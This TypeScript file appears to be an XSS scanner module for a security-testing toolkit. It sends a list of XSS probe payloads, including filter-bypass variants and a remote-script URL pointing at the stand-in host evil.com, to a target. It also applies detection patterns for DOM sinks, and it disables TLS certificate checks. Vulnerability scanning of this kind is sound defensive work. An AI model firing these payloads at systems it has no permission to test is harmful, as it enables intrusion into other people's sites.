// STRIX XSS Scanner Module
// Detects Cross-Site Scripting (XSS) vulnerabilities

import * as http from 'http';
import * as https from 'https';
import { VulnerabilityResult, ModuleInfo, ModuleResult, ProgressCallback } from '../types';

export const moduleInfo: ModuleInfo = {
    name: 'xss_scanner',
    displayName: 'XSS Scanner',
    description: 'Detects reflected and stored XSS vulnerabilities',
    author: 'STRIX',
    version: '1.0.0',
    type: 'vuln_check',
    targetService: 'http',
    options: [
        { name: 'target', type: 'string', required: true, description: 'Target URL with parameters' },
        { name: 'method', type: 'select', required: false, default: 'GET', description: 'HTTP method', choices: ['GET', 'POST'] },
        { name: 'parameters', type: 'string', required: false, description: 'Parameters to test (comma-separated)' },
        { name: 'postData', type: 'string', required: false, description: 'POST data for POST requests' },
        { name: 'cookie', type: 'string', required: false, description: 'Cookie header value' },
        { name: 'timeout', type: 'number', required: false, default: 10000, description: 'Request timeout' },
        { name: 'checkDOM', type: 'boolean', required: false, default: true, description: 'Check for DOM-based XSS sinks' }
    ]
};

// XSS test payloads with markers for detection
const XSS_PAYLOADS = {
    // Basic payloads
    basic: [
        { payload: '<script>alert("XSS")</script>', context: 'html', marker: '<script>alert("XSS")</script>' },
        { payload: '<img src=x onerror=alert("XSS")>', context: 'html', marker: 'onerror=alert' },
        { payload: '<svg onload=alert("XSS")>', context: 'html', marker: '<svg onload=' },
        { payload: '"><script>alert("XSS")</script>', context: 'attribute', marker: '<script>alert' },
        { payload: "'\"><script>alert('XSS')</script>", context: 'attribute', marker: '<script>alert' },
        { payload: '<body onload=alert("XSS")>', context: 'html', marker: '<body onload=' },
        { payload: '<iframe src="javascript:alert(\'XSS\');">', context: 'html', marker: 'javascript:alert' },
    ],
    
    // Event handler payloads
    eventHandlers: [
        { payload: '" onmouseover="alert(\'XSS\')"', context: 'attribute', marker: 'onmouseover=' },
        { payload: "' onfocus='alert(1)' autofocus='", context: 'attribute', marker: 'onfocus=' },
        { payload: '" onclick="alert(1)"', context: 'attribute', marker: 'onclick=' },
        { payload: "' onload='alert(1)'", context: 'attribute', marker: 'onload=' },
        { payload: '" onerror="alert(1)"', context: 'attribute', marker: 'onerror=' },
    ],
    
    // Encoded/bypass payloads
    encoded: [
        { payload: '%3Cscript%3Ealert(1)%3C/script%3E', context: 'html', marker: '<script>alert' },
        { payload: '&lt;script&gt;alert(1)&lt;/script&gt;', context: 'html', marker: '&lt;script' },
        { payload: '<scr<script>ipt>alert(1)</scr</script>ipt>', context: 'html', marker: '<script>alert' },
        { payload: '<ScRiPt>alert(1)</ScRiPt>', context: 'html', marker: '<script>alert' },
        { payload: '<script/src=data:,alert(1)>', context: 'html', marker: 'data:,alert' },
        { payload: '<img src=x onerror=alert`1`>', context: 'html', marker: 'onerror=alert' },
    ],
    
    // JavaScript context payloads
    javascript: [
        { payload: "';alert('XSS');//", context: 'javascript', marker: "alert('XSS')" },
        { payload: '";alert("XSS");//', context: 'javascript', marker: 'alert("XSS")' },
        { payload: '</script><script>alert(1)</script>', context: 'javascript', marker: '<script>alert' },
        { payload: '-alert(1)-', context: 'javascript', marker: 'alert(1)' },
        { payload: '${alert(1)}', context: 'javascript', marker: '${alert' },
    ],
    
    // URL context payloads
    url: [
        { payload: 'javascript:alert(1)', context: 'url', marker: 'javascript:alert' },
        { payload: 'data:text/html,<script>alert(1)</script>', context: 'url', marker: 'data:text/html' },
        { payload: '//evil.com/xss.js', context: 'url', marker: '//evil.com' },
    ],
    
    // CSS context payloads
    css: [
        { payload: 'expression(alert(1))', context: 'css', marker: 'expression(' },
        { payload: '</style><script>alert(1)</script>', context: 'css', marker: '<script>alert' },
        { payload: 'background:url(javascript:alert(1))', context: 'css', marker: 'javascript:alert' },
    ]
};

// DOM-based XSS sink patterns
const DOM_SINKS = [
    // Direct execution sinks
    { pattern: /document\.write\s*\(/gi, sink: 'document.write', severity: 'high' },
    { pattern: /document\.writeln\s*\(/gi, sink: 'document.writeln', severity: 'high' },
    { pattern: /\.innerHTML\s*=/gi, sink: 'innerHTML', severity: 'high' },
    { pattern: /\.outerHTML\s*=/gi, sink: 'outerHTML', severity: 'high' },
    { pattern: /\.insertAdjacentHTML\s*\(/gi, sink: 'insertAdjacentHTML', severity: 'high' },
    { pattern: /eval\s*\(/gi, sink: 'eval', severity: 'critical' },
    { pattern: /setTimeout\s*\(\s*['"]/gi, sink: 'setTimeout', severity: 'high' },
    { pattern: /setInterval\s*\(\s*['"]/gi, sink: 'setInterval', severity: 'high' },
    { pattern: /new\s+Function\s*\(/gi, sink: 'Function constructor', severity: 'critical' },
    
    // URL manipulation sinks
    { pattern: /location\s*=/gi, sink: 'location', severity: 'medium' },
    { pattern: /location\.href\s*=/gi, sink: 'location.href', severity: 'medium' },
    { pattern: /location\.replace\s*\(/gi, sink: 'location.replace', severity: 'medium' },
    { pattern: /location\.assign\s*\(/gi, sink: 'location.assign', severity: 'medium' },
    { pattern: /window\.open\s*\(/gi, sink: 'window.open', severity: 'medium' },
    
    // jQuery sinks
    { pattern: /\$\([^)]*\)\.html\s*\(/gi, sink: 'jQuery.html()', severity: 'high' },
    { pattern: /\$\([^)]*\)\.append\s*\(/gi, sink: 'jQuery.append()', severity: 'medium' },
    { pattern: /\$\([^)]*\)\.prepend\s*\(/gi, sink: 'jQuery.prepend()', severity: 'medium' },
    { pattern: /\$\([^)]*\)\.after\s*\(/gi, sink: 'jQuery.after()', severity: 'medium' },
    { pattern: /\$\([^)]*\)\.before\s*\(/gi, sink: 'jQuery.before()', severity: 'medium' },
];

// DOM sources (user-controllable input)
const DOM_SOURCES = [
    /location\.hash/gi,
    /location\.search/gi,
    /location\.href/gi,
    /document\.URL/gi,
    /document\.documentURI/gi,
    /document\.referrer/gi,
    /window\.name/gi,
    /document\.cookie/gi,
    /localStorage\./gi,
    /sessionStorage\./gi,
];

export interface XSSTestResult {
    parameter: string;
    payload: string;
    context: string;
    vulnerable: boolean;
    reflected: boolean;
    evidence?: string;
}

export interface DOMXSSResult {
    sink: string;
    pattern: string;
    severity: string;
    line?: string;
    hasSource: boolean;
}

export interface XSSScanResult extends ModuleResult {
    data: {
        testedParameters: string[];
        vulnerableParameters: string[];
        reflectedPayloads: XSSTestResult[];
        domXSS: DOMXSSResult[];
    };
}

interface ScanOptions {
    method?: 'GET' | 'POST';
    parameters?: string[];
    postData?: string;
    cookie?: string;
    timeout?: number;
    checkDOM?: boolean;
    onProgress?: ProgressCallback;
}

/**
 * Run XSS scan
 */
export async function run(
    target: string,
    options: ScanOptions = {}
): Promise<XSSScanResult> {
    const startTime = Date.now();
    
    // Parse target URL
    let targetUrl: URL;
    try {
        targetUrl = new URL(target);
    } catch {
        try {
            targetUrl = new URL(`https://${target}`);
        } catch {
            return {
                success: false,
                module: 'xss_scanner',
                target,
                data: { testedParameters: [], vulnerableParameters: [], reflectedPayloads: [], domXSS: [] },
                error: 'Invalid target URL',
                duration: Date.now() - startTime
            };
        }
    }
    
    const result: XSSScanResult = {
        success: true,
        module: 'xss_scanner',
        target,
        data: {
            testedParameters: [],
            vulnerableParameters: [],
            reflectedPayloads: [],
            domXSS: []
        },
        vulnerabilities: [],
        duration: 0
    };
    
    const method = options.method || 'GET';
    const timeout = options.timeout || 10000;
    const checkDOM = options.checkDOM !== false;
    
    // Extract parameters to test
    let parameters: Map<string, string> = new Map();
    
    if (method === 'GET') {
        targetUrl.searchParams.forEach((value, key) => {
            parameters.set(key, value);
        });
    }
    
    if (options.postData) {
        const postParams = new URLSearchParams(options.postData);
        postParams.forEach((value, key) => {
            parameters.set(key, value);
        });
    }
    
    if (options.parameters) {
        parameters = new Map();
        for (const param of options.parameters) {
            parameters.set(param, 'test');
        }
    }
    
    // Get baseline response for DOM analysis
    const baseline = await makeRequest(targetUrl, method, parameters, options.cookie, timeout);
    
    // Check for DOM-based XSS sinks in baseline
    if (checkDOM && baseline.success) {
        const domResults = analyzeDOMXSS(baseline.body);
        result.data.domXSS = domResults;
        
        for (const domResult of domResults) {
            if (domResult.hasSource) {
                result.vulnerabilities!.push({
                    id: 'XSS-DOM-001',
                    name: 'Potential DOM-based XSS',
                    severity: domResult.severity as 'critical' | 'high' | 'medium' | 'low',
                    description: `DOM sink "${domResult.sink}" found with user-controllable source`,
                    evidence: domResult.line || domResult.pattern,
                    remediation: 'Sanitize user input before passing to DOM manipulation functions. Use textContent instead of innerHTML where possible.',
                    host: targetUrl.hostname,
                    port: parseInt(targetUrl.port) || (targetUrl.protocol === 'https:' ? 443 : 80),
                    service: targetUrl.protocol.replace(':', '')
                });
            }
        }
    }
    
    if (parameters.size === 0) {
        // Still return DOM results even without parameters
        result.duration = Date.now() - startTime;
        return result;
    }
    
    result.data.testedParameters = Array.from(parameters.keys());
    
    // Collect all payloads
    const allPayloads = [
        ...XSS_PAYLOADS.basic,
        ...XSS_PAYLOADS.eventHandlers,
        ...XSS_PAYLOADS.encoded,
        ...XSS_PAYLOADS.javascript,
    ];
    
    const total = parameters.size * allPayloads.length;
    let completed = 0;
    
    // Test each parameter
    for (const [param, originalValue] of parameters) {
        for (const { payload, context, marker } of allPayloads) {
            // Create modified parameters
            const testParams = new Map(parameters);
            testParams.set(param, payload);
            
            const response = await makeRequest(targetUrl, method, testParams, options.cookie, timeout);
            
            if (response.success) {
                // Check if payload is reflected in response
                const reflected = isPayloadReflected(response.body, payload, marker);
                
                if (reflected.found) {
                    const testResult: XSSTestResult = {
                        parameter: param,
                        payload,
                        context,
                        vulnerable: reflected.unescaped,
                        reflected: true,
                        evidence: reflected.evidence
                    };
                    
                    result.data.reflectedPayloads.push(testResult);
                    
                    if (reflected.unescaped && !result.data.vulnerableParameters.includes(param)) {
                        result.data.vulnerableParameters.push(param);
                    }
                }
            }
            
            completed++;
            if (options.onProgress) {
                options.onProgress({
                    phase: 'xss_scan',
                    current: completed,
                    total,
                    message: `Testing: ${param} (${completed}/${total})`
                });
            }
        }
    }
    
    // Generate vulnerability reports for reflected XSS
    for (const param of result.data.vulnerableParameters) {
        const paramResults = result.data.reflectedPayloads.filter(
            r => r.parameter === param && r.vulnerable
        );
        const contexts = [...new Set(paramResults.map(r => r.context))];
        
        result.vulnerabilities!.push({
            id: 'XSS-REFLECTED-001',
            name: 'Reflected XSS Vulnerability',
            severity: 'high',
            description: `Reflected XSS found in parameter "${param}" in ${contexts.join(', ')} context(s)`,
            evidence: paramResults[0]?.evidence || paramResults[0]?.payload,
            remediation: 'Encode output based on context (HTML entity encoding, JavaScript encoding, URL encoding). Implement Content-Security-Policy header.',
            host: targetUrl.hostname,
            port: parseInt(targetUrl.port) || (targetUrl.protocol === 'https:' ? 443 : 80),
            service: targetUrl.protocol.replace(':', '')
        });
    }
    
    result.duration = Date.now() - startTime;
    return result;
}

/**
 * Make HTTP request
 */
async function makeRequest(
    url: URL,
    method: string,
    params: Map<string, string>,
    cookie?: string,
    timeout: number = 10000
): Promise<{ success: boolean; body: string; statusCode: number }> {
    return new Promise((resolve) => {
        const isSSL = url.protocol === 'https:';
        
        const requestUrl = new URL(url.toString());
        if (method === 'GET') {
            requestUrl.search = '';
            params.forEach((value, key) => {
                requestUrl.searchParams.set(key, value);
            });
        }
        
        let postBody = '';
        if (method === 'POST') {
            const postParams = new URLSearchParams();
            params.forEach((value, key) => {
                postParams.set(key, value);
            });
            postBody = postParams.toString();
        }
        
        const options: http.RequestOptions = {
            hostname: requestUrl.hostname,
            port: requestUrl.port || (isSSL ? 443 : 80),
            path: requestUrl.pathname + requestUrl.search,
            method,
            timeout,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) STRIX-Scanner/1.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                ...(cookie ? { 'Cookie': cookie } : {}),
                ...(method === 'POST' ? {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Content-Length': Buffer.byteLength(postBody).toString()
                } : {})
            }
        };
        
        if (isSSL) {
            (options as https.RequestOptions).rejectUnauthorized = false;
        }
        
        const protocol = isSSL ? https : http;
        
        const req = protocol.request(options, (res) => {
            let body = '';
            
            res.on('data', (chunk) => {
                body += chunk;
                if (body.length > 500000) {
                    res.destroy();
                }
            });
            
            res.on('end', () => {
                resolve({ success: true, body, statusCode: res.statusCode || 0 });
            });
        });
        
        req.on('timeout', () => {
            req.destroy();
            resolve({ success: false, body: '', statusCode: 0 });
        });
        
        req.on('error', () => {
            resolve({ success: false, body: '', statusCode: 0 });
        });
        
        if (method === 'POST' && postBody) {
            req.write(postBody);
        }
        
        req.end();
    });
}

/**
 * Check if payload is reflected in response
 */
function isPayloadReflected(
    body: string,
    payload: string,
    marker: string
): { found: boolean; unescaped: boolean; evidence?: string } {
    // Check for exact payload reflection (unescaped - vulnerable)
    if (body.includes(payload)) {
        return {
            found: true,
            unescaped: true,
            evidence: extractContext(body, payload)
        };
    }
    
    // Check for marker (key part of payload)
    if (body.toLowerCase().includes(marker.toLowerCase())) {
        return {
            found: true,
            unescaped: true,
            evidence: extractContext(body, marker)
        };
    }
    
    // Check for HTML-encoded reflection
    const encoded = htmlEncode(payload);
    if (body.includes(encoded)) {
        return {
            found: true,
            unescaped: false,
            evidence: 'Payload reflected but HTML-encoded'
        };
    }
    
    // Check for partial reflection
    const simplePayload = payload.replace(/[<>"']/g, '');
    if (simplePayload.length > 5 && body.includes(simplePayload)) {
        return {
            found: true,
            unescaped: false,
            evidence: 'Partial payload reflection detected'
        };
    }
    
    return { found: false, unescaped: false };
}

/**
 * Extract context around matched payload
 */
function extractContext(body: string, match: string): string {
    const index = body.toLowerCase().indexOf(match.toLowerCase());
    if (index === -1) return match;
    
    const start = Math.max(0, index - 50);
    const end = Math.min(body.length, index + match.length + 50);
    
    return '...' + body.substring(start, end) + '...';
}

/**
 * HTML encode a string
 */
function htmlEncode(str: string): string {
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');
}

/**
 * Analyze page for DOM-based XSS
 */
function analyzeDOMXSS(body: string): DOMXSSResult[] {
    const results: DOMXSSResult[] = [];
    
    // Extract script content
    const scriptMatches = body.matchAll(/<script[^>]*>([\s\S]*?)<\/script>/gi);
    const scripts = Array.from(scriptMatches).map(m => m[1]);
    const scriptContent = scripts.join('\n');
    
    // Check for DOM sources
    const hasSource = DOM_SOURCES.some(pattern => pattern.test(scriptContent));
    
    // Check for DOM sinks
    for (const { pattern, sink, severity } of DOM_SINKS) {
        const matches = scriptContent.matchAll(pattern);
        for (const match of matches) {
            // Find the line containing the match
            const index = scriptContent.indexOf(match[0]);
            const lineStart = scriptContent.lastIndexOf('\n', index) + 1;
            const lineEnd = scriptContent.indexOf('\n', index);
            const line = scriptContent.substring(lineStart, lineEnd === -1 ? undefined : lineEnd).trim();
            
            results.push({
                sink,
                pattern: match[0],
                severity,
                line: line.substring(0, 200),
                hasSource
            });
        }
    }
    
    return results;
}

export { XSS_PAYLOADS, DOM_SINKS, DOM_SOURCES };
export default { run, moduleInfo, XSS_PAYLOADS, DOM_SINKS };
